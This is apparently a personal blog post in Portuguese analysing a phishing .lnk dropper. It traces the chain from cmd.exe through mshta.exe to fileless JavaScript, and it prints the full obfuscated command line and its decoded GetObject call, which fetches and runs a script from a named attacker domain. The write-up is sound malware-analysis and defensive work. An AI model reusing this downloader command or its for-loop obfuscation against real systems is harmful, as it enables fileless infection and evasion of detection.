---
id: "malware-analysis-lnk-mshta"
title: "Analisando um malware furtivo que recebi via e-mail"
date: "18/12/2025"
tags: ["Malware Analysis", "Phishing", "Incident Response", "Windows Internals", "MITRE ATT&CK"]
description: "Análise técnica de um arquivo LNK malicioso recebido via phishing que utiliza cmd.exe e mshta.exe para executar payload remoto de forma fileless."
---

# Contexto

Recentemente recebi aquele clássico e-mail de phishing, nele continha um link para download de um arquivo (o que será que poderia ser, né?), resolvi baixar e executar no meu lab para análise de malware e tive uma experiência interessante, o malware se demonstrou não tão "bobo", utilizava técnicas de ofuscação, execução em memória, etc.

- O arquivo estava disfarçado e tinha o formato `.lnk`, técnica utilizada para tentativa de bypasses, abuso de confiança e ocultação da cadeia de execução.

# Algumas informações sobre a amostra

- **Nome:** `kaiZqdJsJYJrst42N.lnk`
- **Tamanho:** 1kb
- **MD5:** `0a8863957d5f2823531d886d74934d98`

O tamanho extremamente reduzido já deixa evidente que ele atua apenas como um "dropper".

# Cadeia de execução

A análise do comportamento mostra o seguinte:

```text
kaiZqdJsJYJrst42N.lnk
└── cmd.exe
    └── mshta.exe
        └── JavaScript (fileless)
```

### Processos 

- `cmd.exe` (PID 4840)
- `cmd.exe` (PID 4716)

### Ofuscação

O comando real "empacotado" no arquivo `.lnk` utiliza vários loops "for" para reconstrução dinâmica de certas strings:

```cmd
for %H in (Ava) do
for %P in (ht) do
for %M in (m) do
for %k in (sCr) do
```

Combinando tudo isso, eles criam as strings `[mshta]` e `[javascript]`.

Após a desobfuscação do trecho completo:

```cmd
"C:\Windows\System32\cmd.exe" /CGAG:FLFY /ZDK:AONP /D/C "for %H in (Ava) do for %P in (ht) do for %M in (m) do for %k in (sCr) do %MS%Pa "j%H%kipt:try{try{try{var _33lI1CGAG=["\x59\113\x54\x52\x45\x39\x4c","\x73\x63\x72\x69\160\x74\x3a\x48\x74\x74\x50\x73\x3a\x2f\x2f\x70\154\x61\164\x61\x6e\x6e\141\x6e\x6b\x69\x6c\x36\x2e\142\x6f\x6f\x6d\157\162\x61\56\163\160\x61\143\x65\x2f\x3f\x31\57"];GetObject(_33lI1CGAG[1])[_33lI1CGAG[0]]();}catch(e){}}catch(e){}}catch(e){}close()]
```

Reconstruimos para:

```javascript
GetObject("script:[https://platannankil6.boomora.space/?1/](https://platannankil6.boomora.space/?1/)")["YKTRE9L"]();
```

### Domínios

O seguinte domínio foi detectado durante a análise: 
`https://platannankil6.boomora.space/?1/`

Monitorando as conexões e portas com o `netstat -b`, foi possível notar uma conexão remota ao IP que correspondia a esse domínio.

# Conclusão

A análise da amostra `kaiZqdJsJYJrst42N.lnk` confirma que se trata de um estágio inicial de ataque (Downloader/Dropper) furtivo. O malware explora a técnica **Living off the Land (LotL)**, abusa de binários nativos e confiáveis do Windows (`cmd.exe` e `mshta.exe`) para tentar mascarar suas atividades.

Pontos chaves:
1.  **Evasão de Defesa:** O uso de ofuscação em linha de comando (loops `for` para reconstruir strings) visa burlar detecções baseadas em assinaturas estáticas.
2.  **Execução Fileless:** A utilização do `mshta` para executar código JavaScript diretamente de uma URL remota evita a gravação de arquivos binários no disco, dificultando a análise tradicional.

Este comportamento é característico de campanhas que buscam estabelecer persistência ou baixar payloads secundários sem alertar as proteções ativas.

# Imagens

![Malware em ação](/images/img1.PNG)